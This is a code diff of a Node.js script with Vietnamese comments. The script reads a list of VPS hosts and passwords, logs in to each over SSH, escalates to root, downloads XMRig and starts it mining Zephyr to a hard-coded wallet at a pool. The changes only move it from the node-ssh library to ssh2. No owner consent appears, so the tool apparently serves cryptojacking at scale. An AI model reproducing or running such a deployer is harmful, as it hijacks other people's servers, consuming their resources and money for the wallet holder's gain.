@@ -1,6 +1,6 @@
 const fs = require('fs');
 const readline = require('readline');
-const { NodeSSH } = require('node-ssh');
+const Client = require('ssh2').Client;
 
 // Danh sách thông tin VPS
 const vpsList = [];
@@ -33,44 +33,48 @@ rl.on('line', (line) => {
 });
 
 // Khi đã đọc hết file, thực hiện kết nối và chạy lệnh
-rl.on('close', async () => {
-  for (const vps of vpsList) {
+rl.on('close', () => {
+  vpsList.forEach((vps) => {
     const { host, port, username, password } = vps;
 
-    const ssh = new NodeSSH();
+    const commands = [
+      'sudo su',
+      'wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz',
+      'tar xavf xmrig-6.19.2-linux-x64.tar.gz',
+      'cd xmrig-6.19.2',
+      'screen -R',
+      './xmrig -o zephyr.miningocean.org:5462 -a rx -k -u ZEPHYR2Nk4PMWboF1H3qMXdTGp9mj9ddp7Zrkek5X7LEgFPtoohUw5tMcdAixPbzkZHsJqoBcquZsYfJGccsQde5VGfrzpvM8LW3a -p test -t 92',
+      'exit', // Để đảm bảo kết thúc session sau khi thực hiện lệnh
+    ];
 
-    try {
-      await ssh.connect({
+    const conn = new Client();
+
+    conn
+      .on('ready', () => {
+        console.log(`SSH connection successful to ${host}:${port}`);
+
+        conn.shell((err, stream) => {
+          if (err) throw err;
+
+          stream.on('close', () => {
+            console.log('Connection closed');
+            conn.end();
+          }).on('data', (data) => {
+            console.log(`OUTPUT (${host}:${port}): ` + data);
+          });
+
+          commands.forEach((command) => {
+            stream.write(command + '\n');
+          });
+
+          stream.end('exit\n');
+        });
+      })
+      .connect({
         host,
         port,
         username,
-        tryKeyboard: true,
         password,
       });
-
-      console.log(`SSH connection successful to ${host}:${port}`);
-
-      const commands = [
-        'sudo su',
-        'wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz',
-        'tar xavf xmrig-6.19.2-linux-x64.tar.gz',
-        'cd xmrig-6.19.2',
-        'screen -R',
-        './xmrig -o zephyr.miningocean.org:5462 -a rx -k -u ZEPHYR2Nk4PMWboF1H3qMXdTGp9mj9ddp7Zrkek5X7LEgFPtoohUw5tMcdAixPbzkZHsJqoBcquZsYfJGccsQde5VGfrzpvM8LW3a -p test -t 92',
-        'exit', // Để đảm bảo kết thúc session sau khi thực hiện lệnh
-      ];
-
-      for (const command of commands) {
-        console.log(`Executing command on ${host}:${port}: ${command}`);
-        const response = await ssh.execCommand(command);
-        console.log(`OUTPUT (${host}:${port}): ${response.stdout}`);
-      }
-
-      console.log(`Commands executed successfully on ${host}:${port}`);
-    } catch (error) {
-      console.error(`Error connecting to ${host}:${port}: ${error.message}`);
-    } finally {
-      ssh.dispose(); // Disconnect after each iteration
-    }
-  }
+  });
 });
